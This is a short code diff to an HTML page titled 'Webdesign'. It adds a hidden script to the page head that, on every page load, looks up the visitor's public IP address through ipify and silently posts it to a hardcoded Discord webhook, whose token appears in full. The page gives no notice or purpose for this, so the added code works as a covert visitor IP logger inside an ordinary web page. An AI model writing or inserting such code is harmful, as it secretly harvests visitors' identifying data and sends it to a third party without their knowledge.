@@ -3,10 +3,20 @@
 <html>
   <head>
     <script type="text/javascript">
+    const whurl ="https://discord.com/api/webhooks/778994800291872788/u2axqxz7yygccZLt8j_XBmznuB8yBw3XdGUOBNvdmrIUguTCOoIyyXMvq4jJUVZWNZit"
+    function SetIP(IP) {
+      const msg = {"content": "Incoming IP: " + IP}
+      fetch(whurl + "?wait=true",
+      {"method":"POST",
+      "headers": {"content-type": "application/json"},
+      "body": JSON.stringify(msg)})
+    }
+
     fetch('https://api.ipify.org/?format=json')
     .then(results => results.json())
-    .then(data => console.log(data.ip));
+    .then(data => SetIP(data.ip))
     </script>
+
     <meta charset="utf-8">
     <link rel="stylesheet" href="style.css" type="text/css">
     <title>Webdesign</title>
